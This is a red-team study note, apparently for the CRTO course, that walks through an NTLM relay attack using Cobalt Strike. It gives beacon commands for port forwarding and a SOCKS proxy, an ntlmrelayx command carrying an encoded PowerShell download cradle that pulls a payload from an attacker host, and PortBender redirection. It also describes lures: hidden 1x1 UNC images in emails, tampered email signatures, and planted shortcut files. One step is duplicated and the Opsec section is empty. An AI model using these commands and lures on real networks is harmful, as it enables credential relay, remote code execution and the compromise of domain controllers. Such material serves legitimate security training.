
In an NTLM relay attack, an attacker is able to intercept or capture NTLM authentication traffic and effectively allows them to impersonate the client against the same, or another service.  

For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

## 🖊️ Tools

[Responder](https://github.com/lgandx/Responder) 
[ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx)

## 📔 via [[Cobalt Strike]]

It's still possible to do with Cobalt Strike, but requires the use of multiple capabilities simultaneously.

1. A [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

Process:

1) Obtain a SYSTEM beacon on the machine you will capture the SMB traffic on.
2) Next, allow those ports inbound on the Windows firewall.

```
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

3) Then start two reverse port forwards - one for the SMB capture, the other for a PowerShell download cradle.

```
beacon> rportfwd 8445 localhost 445
[+] started reverse port forward on 8445 to localhost:445

beacon> rportfwd 8080 localhost 80
[+] started reverse port forward on 8080 to localhost:80
```

4) The final part of the setup is to start a SOCKS proxy that ntlmrelayx can use to send relay responses back into the network.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

5) Now we can start `ntlmrelayx.py` listening for incoming connections on the Team Server.  The `-c` parameter allows us to execute an arbitrary command on the target after authentication has succeeded.

```
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Where:

- 10.10.122.10 is the IP address of `dc-2.dev.cyberbotic.io`, which is our target.
- The encoded command is a download cradle pointing at `http://10.10.123.102:8080/b`, and `/b` is an SMB payload.

6) [PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and aggressor script specifically designed to help facilitate relaying through Cobalt Strike.  It requires that the driver be located in the current working directory of the Beacon.  It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.

```
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```

7) Then go to _Cobalt Strike > Script Manager_ and load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.
8) Then go to _Cobalt Strike > Script Manager_ and load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.
9) Execute PortBender to redirect traffic from 445 to port 8445.

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to our listening machine. 

10) Once a user authenticates against our listening machine, all that's left is to link to the Beacon.
```
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.10
```


##  📗 Lure users into triggering NTLM Relaying

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

`<img src="\\10.10.123.102\test.ico" height="1" width="1" />`

A sneakier means may be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon.  Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).  A good location for these is on publicly readable shares.

The easiest way to create a shortcut is with PowerShell.
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()
```

#### Remote Authentication Triggers

Tools such as [SpoolSample](https://github.com/leechristensen/SpoolSample), [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) and [PetitPotam](https://github.com/topotam/PetitPotam) can force a computer into authenticating to us.  These generally work via Microsoft RPC protocols, such as [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and [MS-EFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4892c610-4595-4fba-a67f-a2d26b9b6dcd).

### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 20:16
🏷️ tags: #redteam #crto 

---

